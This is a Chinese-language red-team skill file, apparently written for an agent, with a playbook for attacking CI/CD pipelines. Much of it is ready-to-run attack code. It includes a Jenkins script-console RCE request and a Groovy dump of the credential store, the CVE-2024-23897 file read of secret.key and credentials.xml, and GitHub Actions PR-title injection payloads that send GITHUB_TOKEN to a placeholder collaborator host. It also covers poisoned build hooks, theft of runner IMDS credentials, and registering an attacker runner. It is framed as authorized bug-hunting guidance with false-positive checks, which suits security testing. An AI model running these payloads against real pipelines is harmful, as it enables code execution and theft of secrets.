---
name: hunt-cicd
description: "挖掘 CI/CD 流水线漏洞——GitHub Actions 工作流注入（pull_request_target Pwnrequest + ${{ }}-into-shell）、自托管 runner 投毒、OIDC 信任策略滥用、Jenkins 脚本控制台 RCE 与 CVE-2024-23897 文件读取、GitLab CI runner-token 注册、Terraform state 文件泄露、制品/日志密钥泄露、流水线环境变量披露。当目标具有公开的 GitHub/GitLab 组织、暴露的 CI 仪表盘（Jenkins/TeamCity/Drone/Argo），或构建制品/镜像可达时使用。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [cicd, pipeline, hunt, redteam]
  category: redteam
---

# HUNT-CICD —— CI/CD 流水线安全

## When to Use

- 目标具有公开的 GitHub/GitLab 组织、暴露的 CI 仪表盘（Jenkins/TeamCity/Drone/Argo）。
- 构建制品/镜像可达。

## Prerequisites

- 针对目标的明确授权、目标边界与速率限制。
- 工具：`curl`、`gh`、`jq`、`trufflehog`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在执行命令前立即获得明确确认。

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)
curl --max-time 30 --connect-timeout 10 -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
curl --max-time 30 --connect-timeout 10 -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
  code=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
  echo "$p -> $code"   # 200 on /script == anon script console; 403/401 == auth required (NOT a finding alone)
done
```

## Procedure

以下各阶段即为操作流程。保持每次探测有界（`--max-time`），将证据记录在 `OUTPUT_DIR` 下，并在遇到陷阱中列出的停止条件时停止。

## 最高价值目标

Jenkins `/script` 控制台可达 = 立即 RCE。GitHub Actions 的 `pull_request_target`（或 `workflow_run`）工作流若检出了 **PR head ref**，并在 shell `run:` 中引用不可信的 `${{ github.event.* }}`，即构成“Pwnrequest” → 零审批即可从 fork PR 外泄密钥。

**最高价值的发现：**
- **Jenkins 脚本控制台** —— Groovy 执行 → 完整 RCE → 导出凭据库
- **Jenkins CLI 文件读取（CVE-2024-23897）** —— 前置鉴权的 `@/etc/passwd` 参数展开 → 读取 `secret.key`/`credentials.xml` → 伪造管理员 → RCE
- **GitHub Actions `pull_request_target` 注入（Pwnrequest）** —— fork PR 控制特权 shell 步骤内的 `${{ }}` → 外泄 `GITHUB_TOKEN`（通常为 `contents:write`）与组织密钥
- **自托管 runner 投毒** —— 公开仓库上的非临时 runner 执行 fork PR 的构建 → 攻击者代码在 runner 主机上运行 → 持久化 + 窃取密钥
- **OIDC 信任策略滥用** —— AWS IAM 角色信任策略中过宽的 `sub` 声明通配 → 组织内任何工作流都可假定一个特权云角色
- **Terraform state 泄露** —— 公开 S3/GCS/Blob 中的 `*.tfstate` → 明文基础设施凭据、DB 密码、私钥
- **Runner token / 制品 / 日志泄露** —— 注册攻击者 runner，或在 `::add-mask::` 之前收集被打印的密钥

---

## “无证据即未发生”闸门（请先阅读）

CI/CD 发现常被过度报告，因为仪表盘*看起来*可利用。在做出任何结论之前：

1. **登录页面不是 RCE。** 返回 Jenkins 登录页或 `403` 的可达 `/script` URL **并非**未授权脚本控制台。只有在实际的 `scriptText` POST 中返回你命令的输出才算数。
2. **`pull_request_target` 工作流并非自动可注入。** 只有当不可信数据流入执行 sink 时才可利用。在打开任何 PR 之前，先确认该数据流（见误报章节）。
3. **盲注入需要 OOB。** 若存在漏洞的步骤没有你可读取的输出，则**必须**通过 Burp Collaborator / interactsh 确认——使用每个 sink 唯一的子域名，由 runner 向其发起回连。工作流“跑绿了”并不能证明你的代码被执行。
4. **`.tfstate` 返回 HTTP 200 不等于凭据暴露，须先解析。** 与基线进行比对（见误报章节）——许多 `tfstate` 文件只包含资源 ID 与 outputs，没有密钥。

---

## 阶段 1 —— Jenkins：检测、脚本控制台、CVE-2024-23897

```bash
# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)
curl --max-time 30 --connect-timeout 10 -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
curl --max-time 30 --connect-timeout 10 -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
  code=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
  echo "$p -> $code"   # 200 on /script == anon script console; 403/401 == auth required (NOT a finding alone)
done
```

**未授权脚本控制台 → RCE（仅当 POST 返回输出时）：**
```bash
# This must return uid=...(jenkins). If it returns the Jenkins login HTML or a
# Crowd/SSO error page, the console is NOT anon-accessible — do not report it.
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/scriptText" \
  --data-urlencode 'script=println "id".execute().text'
```

**导出凭据库**（Groovy 可解密 UI 中被掩码的密钥）：
```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import org.jenkinsci.plugins.plaincredentials.StringCredentials
CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.username} :: ${it.password}"
}
CredentialsProvider.lookupCredentials(StringCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.secret}"
}
```

**CVE-2024-23897 —— 通过 Jenkins CLI 实现前置鉴权任意文件读取**（args4j 的 `@` 文件展开；影响 ≤2.441 / LTS ≤2.426.2）。在允许匿名读取的情况下，可读取 `secret.key` + `master.key` 解密 `credentials.xml`，或读取某用户的 `config.xml` API token，从而升级为 RCE：
```bash
# Download the matching jenkins-cli.jar from /jnlpJars/jenkins-cli.jar first.
java -jar jenkins-cli.jar -s "https://$TARGET/" -http connect-node "@/etc/passwd"
# The file content is echoed back in the error. Then target:
#   @/var/lib/jenkins/secret.key  @/var/lib/jenkins/secrets/master.key
#   @/var/lib/jenkins/credentials.xml
```
验证：响应中必须包含真实的文件内容（root:x:0:0）。若仅返回泛化的“no such agent”且未泄露任何行，说明实例已打补丁或路径错误——不构成发现。

---

## 阶段 2 —— GitHub Actions：Pwnrequest、`${{ }}` 注入 Shell、Runner 投毒、OIDC

### 核心区别（90% 的错误 PoC 都死在这里）

存在**两类** sink——它们需要不同的 payload：

- **`${{ }}` 模板展开进入 shell `run:`** —— 表达式在 shell 运行*之前*被替换进脚本，因此不可信字段中的换行/反引号/`$(...)` 会成为字面 shell 内容。这是经典注入。
- **在 shell 内读取环境变量** —— `GITHUB_TOKEN`、`secrets.X` 以及任何 `env:` 映射值都是**值即为该字符串本身的 shell 变量**。要外泄它们应使用 `echo`/`printenv`，**绝不要**用 `cat $VAR`（那会尝试打开一个*以该 token 命名*的文件，什么也打印不出来）。

```yaml
# VULNERABLE workflow (untrusted title flows into the script text):
on: pull_request_target            # runs with write token + secrets, on fork PRs
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # checks out ATTACKER code
      - run: echo "Building PR ${{ github.event.pull_request.title }}"   # ← ${{ }} INJECTION
```

**通过 `${{ }}` sink 攻击** —— 设置 PR 的 **title**（或分支名、body、label、commit message——均为攻击者可控）以跳出 echo 并执行你自己的命令。用 `printenv` 而非 `cat` 外泄 token：
```
PR title:  a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | { read T; curl "https://x.<COLLAB>/?t=$T"; }; echo "
```
对于多行 YAML `run:`，换行注入更为干净：
```
PR title:  foo\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)
```

**通过被投毒的检出攻击（无需 `${{ }}`）** —— 若 `pull_request_target` 检出了 PR head，随后运行构建脚本或从检出树安装依赖（`make`、带恶意 `preinstall` 的 `npm ci`、Makefile、PR 中的 `.github/` action），则*runner 会直接执行攻击者代码*。可植入任意构建钩子：
```bash
# in attacker's PR, e.g. package.json preinstall or Makefile:
curl --max-time 30 --connect-timeout 10 -s "https://x.<COLLAB>/?env=$(printenv | base64 -w0)"
cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected as env
```

**自托管 runner 投毒** —— 若**公开**仓库使用 `pull_request`/`pull_request_target` 且 `runs-on: self-hosted`（或自定义 label），fork PR 的任务会运行在组织自有的主机上。非临时 runner 会在任务之间保留工具/凭据。可通过在任务内部读取 runner 的身份与元数据来确认：
```bash
- run: |
    whoami; hostname; id
    curl --max-time 30 --connect-timeout 10 -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
```

**OIDC 信任策略滥用** —— 通过 OIDC 使用 `configure-aws-credentials` 的工作流会假定一个 IAM 角色。若某个信任策略的 `token.actions.githubusercontent.com:sub` 条件缺失，或使用了宽松通配（`repo:ORG/*:*`），则组织中的**任何**工作流（包括你可合并的恶意工作流，或处于配置错误触发器下的 fork）都能假定该角色。检查该角色：
```bash
aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'
# Red flag: StringLike on sub with "repo:ORG/*" or no sub condition at all (only aud).
```
随后加以证明：从你在组织内控制的工作流中假定该角色，并运行 `aws sts get-caller-identity`，返回特权角色的 ARN。

### 侦察

```bash
# Enumerate org workflows that use the dangerous triggers
gh api graphql -f query='{organization(login:"ORG"){repositories(first:100){nodes{name}}}}' \
  | jq -r '.data.organization.repositories.nodes[].name' | while read r; do
  for wf in $(gh api "repos/ORG/$r/contents/.github/workflows" 2>/dev/null | jq -r '.[]?.name'); do
    body=$(gh api "repos/ORG/$r/contents/.github/workflows/$wf" 2>/dev/null | jq -r '.content' | base64 -d)
    echo "$body" | grep -Eq 'pull_request_target|workflow_run' && \
      echo "$body" | grep -Eq '\$\{\{ *github\.event|self-hosted|head\.ref|head\.sha' && \
      echo "CANDIDATE: ORG/$r/$wf"
  done
done
```
在打开任何 PR 之前，用静态分析器筛选候选：`gh extension install rhysd/actionlint`，或运行 **zizmor**（`pip install zizmor; zizmor .github/workflows/`），后者专门标记模板注入与危险检出模式。

---

## 阶段 3 —— 日志与制品中的密钥

```bash
# Public-repo run logs frequently contain secrets printed BEFORE ::add-mask:: took effect,
# or echoed via debug. The masker only hides exact known values — derived/base64 forms slip through.
gh api "repos/ORG/REPO/actions/runs" | jq -r '.workflow_runs[:20][].id' | while read id; do
  gh api "repos/ORG/REPO/actions/runs/$id/logs" > /tmp/r.zip 2>/dev/null && \
  unzip -o -q /tmp/r.zip -d /tmp/runlogs && \
  grep -rniE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN|eyJ[A-Za-z0-9_-]{10,}\.' /tmp/runlogs
done

# Artifacts — env dumps, .env, kubeconfig, built binaries with embedded secrets
gh api "repos/ORG/REPO/actions/artifacts" | jq -r '.artifacts[] | "\(.id) \(.name)"'
```
注意 `actions/upload-artifact` **不会**脱敏密钥——名为 `env`/`debug` 的制品是常见的直接泄露源。

---

## 阶段 4 —— GitLab CI

```bash
# Runner registration token → register an attacker runner that picks up jobs (and their secrets).
# Found in config.toml (via LFI/disclosure), screenshots, /admin/runners, or leaked CI logs.
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/v4/projects/PID/variables" -H "PRIVATE-TOKEN: $TOK"   # masked? protected?
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $TOK"

# .gitlab-ci.yml review: unmasked variables, `CI_JOB_TOKEN` over-permission,
# `rules:` that run privileged jobs on MRs from forks (the GitLab analogue of pull_request_target).
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main"
```
仅有注册 token **并不**构成发现，除非该实例允许此 token 注册的 runner 执行目标项目的流水线。需通过注册一个你自有的临时 runner 并捕获任务的被掩码变量来证明。

---

## 阶段 5 —— Terraform State 泄露

```bash
# Probe common public-bucket/path patterns (parameterize $T and $ORG)
for U in \
  "https://$ORG.s3.amazonaws.com/terraform.tfstate" \
  "https://s3.amazonaws.com/$ORG-tfstate/terraform.tfstate" \
  "https://$ORG-infra.s3.amazonaws.com/env/prod/terraform.tfstate" \
  "https://storage.googleapis.com/$ORG-tfstate/default.tfstate" \
  "https://$ORG.blob.core.windows.net/tfstate/terraform.tfstate" ; do
  code=$(curl --max-time 30 --connect-timeout 10 -s -o /tmp/tf.json -w "%{http_code}" "$U")
  [ "$code" = "200" ] && echo "[+] 200 $U" && \
    jq -r '.resources[].instances[].attributes
           | to_entries[] | select(.key|test("password|secret|private_key|token|access_key";"i"))
           | "\(.key) = \(.value)"' /tmp/tf.json 2>/dev/null
done
# Also hunt state in repos / backend configs
gh search code --owner ORG "terraform.tfstate" --limit 10
gh search code --owner ORG 'backend "s3"' --limit 10
```
**误报过滤：** 仅列出 `id`、`arn`、`tags` 的 `tfstate` 不是密钥泄露。运行上方的 `jq` 并确认至少存在一个*有效*凭据（真实的 `password`、`private_key`、RDS 主密码或未轮换的 access key）。随后用该凭据以只读方式证明影响（`aws sts get-caller-identity`、返回 banner 的 DB 连接）——不要只声称“state 里有凭据”。

---

## 阶段 6 —— 构建制品 / 镜像分析

```bash
docker pull ORG/IMAGE:latest
docker history --no-trunc ORG/IMAGE:latest | grep -iE 'ENV|ARG|secret|token|password|key'
# Layer-level scan catches secrets removed in a later layer but still present in history:
trufflehog docker --image ORG/IMAGE:latest --only-verified
```
`--only-verified` 会过滤出 trufflehog 实际能够通过认证的凭据——在报告前用它剔除过期/示例密钥的噪声。

---

## 有据可查的参考（具名案例 / CVE）

- **Pwnrequest / `pull_request_target` 类别** —— GitHub Security Lab（Jaroslav Lobačevski），“Keeping your GitHub Actions and workflows secure: Untrusted input.”。关于 fork PR 密钥外泄与危险检出模式的原始文章。
- **GitHub Actions 工作流命令注入 —— CVE-2020-15228** —— `set-env`/`add-path` 工作流命令允许从日志输出注入 env/PATH；这促使这些命令被弃用，并转向 `$GITHUB_ENV`。
- **Jenkins CLI 任意文件读取 —— CVE-2024-23897** —— args4j 的 `@` 前缀文件展开（Jenkins ≤2.441 / LTS ≤2.426.2），读取 `secret.key`/`credentials.xml` → 管理员 → RCE。
- **Jenkins Stapler RCE —— CVE-2018-1000861** —— 动态路由可到达 `groovy.lang.GroovyShell`；是较旧 Jenkins 上未授权脚本执行链的常用组件。
- **PortSwigger / Liam Galvin 等** —— 关于 GitHub Actions 注入 sink（title/branch/body/label）与 `${{ }}` 注入 `run` 的模板替换向量的研究；也是上文所列 actionlint/zizmor 检测规则的基础。

（此处仅列出我能精确溯源的 CVE 与案例。在据此下结论前，请对照该 CVE 的受影响范围确认正在运行的版本。）

---

## 利用链表

| CI/CD 发现 | 可串联至 | 影响 |
|---|---|---|
| Jenkins 未授权脚本控制台 | 导出凭据库 → 云/DB 凭据 → 横向移动 | 严重 |
| Jenkins CLI 文件读取（CVE-2024-23897） | 读取 `secret.key`+`credentials.xml` → 伪造管理员 → RCE | 严重 |
| Actions `${{ }}` 注入（Pwnrequest） | `printenv GITHUB_TOKEN`/密钥 → 推送至受保护分支 | 严重 |
| 自托管 runner 投毒 | 在 runner 主机上执行代码 → IMDS 凭据 → 持久化 | 严重 |
| OIDC `sub` 通配 | 从组织内任意工作流 `AssumeRole` 特权云角色 | 严重 |
| 含有效凭据的 Terraform state | 使用基础设施/DB/API 凭据 | 严重 |
| GitLab runner 注册 | 注册 runner → 捕获流水线密钥 | 高危/严重 |
| 镜像/日志/制品中的密钥 | 直接使用凭据 | 高危 |

---

## 验证纪律（每项发现，报告前）

- **Jenkins 控制台：** `scriptText` POST 返回你 `id` 的输出（`uid=…(jenkins)`）。返回登录/SSO/Crowd 页面 = **不是**未授权访问。需对请求与响应截图。
- **CVE-2024-23897：** 响应包含真实的 `/etc/passwd` 内容；确认版本在受影响范围内。已修补的实例会返回不含泄露行的错误。
- **Actions 注入：** 先确认数据流入 sink（见误报章节）。盲步骤 → **必须**有带 runner 源 IP 的 Collaborator 回调。通过 `printenv`/`/proc/self/environ` 在你自己的端点上解码 token——绝不要 `cat $GITHUB_TOKEN`。
- **OIDC 滥用：** 从你控制的工作流执行 `aws sts get-caller-identity` 返回特权角色的 ARN——而不只是一个看起来宽松的信任策略。
- **Terraform state：** `jq` 提取出至少 1 个*有效*密钥，随后以只读认证加以证明。仅含 ID/ARN 的 state = 无发现。
- **Runner token / 镜像 / 日志：** 证明该密钥可通过认证（trufflehog `--only-verified`，或一次真实 API 调用）——仅持有某个字符串不构成影响。

### 应撤回的常见误报
- 将返回登录页（需鉴权）的 `/script` 报告为“未授权 RCE”。
- 存在 `pull_request_target`，但不可信输入从未到达 sink（例如仅用于 `github.actor` 上的 `if:`，或工作流使用的是 `pull_request` 而非 `_target`）。
- 已包裹在 `env:` 块中并在 shell 内加引号的 `${{ }}` 引用（推荐的安全模式）——不可注入。
- 返回 200 但仅含资源元数据的 `.tfstate`。
- 受 `protected` 保护、且仅向攻击者无法推送的受保护分支暴露的 GitLab 掩码变量。
- trufflehog 的“未验证”命中，实为示例/过期密钥。

**严重性：** Jenkins 控制台 / CVE-2024-23897 / Actions 密钥外泄 / runner 投毒 / OIDC 角色假定 / Terraform 有效凭据 = **严重**。镜像/日志/制品中的密钥按凭据范围 = **高危/严重**。

---

## Pitfalls

- **暴露 .git/config 但无对象访问** —— `/.git/config` 返回 200 证明仓库可达，但没有 `/.git/objects/` 访问权限就无法提取源码。两条路径都要测试。
- **CI/CD 日志泄露** —— 构建日志常含密钥（API key、token），但仅对已认证用户可见。匿名与已认证两种访问都要测试。
- **流水线注入但无执行证明** —— 注入到流水线 YAML 或 Jenkinsfile 并不证明执行。需要确认流水线确实运行了你的代码。
- **GitHub Actions 的 workflow_dispatch** —— 若 action 带有 `workflow_dispatch` 触发器，则可通过 API 触发。需测试该触发器是否限制为特定分支或用户。
- **容器镜像仓库配置错误** —— 公开容器镜像可能包含构建密钥、源码或凭据。应始终拉取并检查各层。
- **跨构建的制品投毒** —— 若构建制品在存储时未做按构建隔离，上一次构建的制品可能被提供给下一次构建。
- **CI/CD 掩码变量** —— 在 heredoc 中或经 base64 编码后记录掩码变量仍会泄露它。需测试可绕过掩码的输出格式。

---

## Verification

- 每项被采纳的发现都要说明预期行为、观测到的响应，以及排除误报的阴性对照。
- 影响需以最小的必要状态变更来证明；仅有状态码、banner 或扫描器标签不构成发现。
- 请求、响应、UTC 时间戳与工具版本记录在 `${OUTPUT_DIR:-./output}` 下，以便复核者复现该结论。

---
